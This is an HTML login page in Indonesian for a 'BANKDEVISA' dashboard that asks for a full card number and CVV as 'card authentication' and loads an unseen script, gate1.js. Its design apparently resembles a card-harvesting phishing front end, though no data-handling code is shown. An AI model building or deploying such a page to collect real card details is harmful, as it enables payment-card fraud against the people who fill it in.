<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login | BDN Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #f8fafc; --navy: #0f172a; --gold: #b8924e; --white: #ffffff;
            --text-main: #1e293b; --text-muted: #64748b;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: var(--bg); display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        
        .login-card {
            background: var(--white); padding: 2.5rem; border-radius: 24px;
            width: 100%; max-width: 400px; border: 1px solid #e2e8f0;
            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
        }
        .logo { font-weight: 800; font-size: 1.5rem; color: var(--navy); text-align: center; margin-bottom: 2rem; }
        .logo span { color: var(--gold); }
        
        h2 { font-size: 1.2rem; margin-bottom: 0.5rem; color: var(--navy); text-align: center; }
        p.desc { font-size: 0.85rem; color: var(--text-muted); text-align: center; margin-bottom: 2rem; }

        .input-group { margin-bottom: 1.2rem; }
        label { display: block; font-size: 0.75rem; font-weight: 800; color: var(--navy); margin-bottom: 0.5rem; text-transform: uppercase; }
        input {
            width: 100%; padding: 12px 16px; border-radius: 12px;
            border: 1px solid #e2e8f0; font-family: inherit; font-size: 1rem;
            transition: 0.3s; outline: none;
        }
        input:focus { border-color: var(--gold); box-shadow: 0 0 0 4px rgba(184, 146, 78, 0.1); }
        
        .btn-gold {
            width: 100%; padding: 14px; border-radius: 12px; border: none;
            background: var(--navy); color: white; font-weight: 700;
            cursor: pointer; transition: 0.3s; margin-top: 1rem;
        }
        .btn-gold:hover { background: var(--gold); transform: translateY(-2px); }
        .error-msg { color: #ef4444; font-size: 0.75rem; font-weight: 700; margin-top: 10px; text-align: center; display: none; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">BANK<span>DEVISA</span></div>
        <h2>Otentikasi Kartu</h2>
        <p class="desc">Masukkan Nomor Kartu & CVV untuk melanjutkan.</p>

        <div class="input-group">
            <label>Nomor Kartu (16 Digit)</label>
            <input type="text" id="cardNo" placeholder="0810 3119 ...." maxlength="16">
        </div>
        <div class="input-group">
            <label>Kode CVV</label>
            <input type="password" id="cvv" placeholder="***" maxlength="3">
        </div>

        <button class="btn-gold" id="btnNext">VERIFIKASI</button>
        <div id="error" class="error-msg">Nomor Kartu atau CVV salah!</div>
    </div>

    <script type="module" src="gate1.js"></script>
</body>
</html>
